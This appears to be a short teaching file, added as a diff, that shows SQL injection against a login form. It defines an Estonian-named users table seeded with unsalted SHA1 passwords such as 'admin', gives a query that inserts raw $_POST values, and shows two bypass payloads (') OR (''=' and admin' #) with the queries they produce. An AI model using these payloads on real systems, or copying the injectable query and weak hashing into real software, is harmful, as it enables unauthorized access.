@@ -1,0 +1,52 @@
+CREATE TABLE IF NOT EXISTS `ttanav3_kasutajad` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `kasutaja` varchar(100) COLLATE utf8_estonian_ci DEFAULT NULL,
+  `parool` varchar(40) COLLATE utf8_estonian_ci DEFAULT NULL,
+  `roll` enum('admin','kasutaja') COLLATE utf8_estonian_ci DEFAULT 'kasutaja',
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `kasutaja` (`kasutaja`)
+);
+
+INSERT INTO ttanav3_kasutajad VALUES (NULL, 'admin', SHA1('admin'), 'admin');
+
+INSERT INTO ttanav3_kasutajad (parool, kasutaja) VALUES 
+(SHA1('asd'), 'asd'), 
+(SHA1('qwerty'), 'qwerty');
+
+
+
+SELECT id, kasutaja, roll FROM ttanav3_kasutajad WHERE kasutaja = '{$_POST['username']}'   AND parool = SHA1('{$_POST['passwd']}')
+
+u: mingi
+p: ') OR (''='
+
+SELECT id, kasutaja, roll FROM ttanav3_kasutajad WHERE kasutaja = 'mingi'   AND parool = SHA1('') OR (''='')
+
+u: admin' # -- HaXZORS
+p: suva
+
+
+SELECT id, kasutaja, roll FROM ttanav3_kasutajad WHERE kasutaja = 'admin' # -- HaXZORS' AND parool = SHA1('suva')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
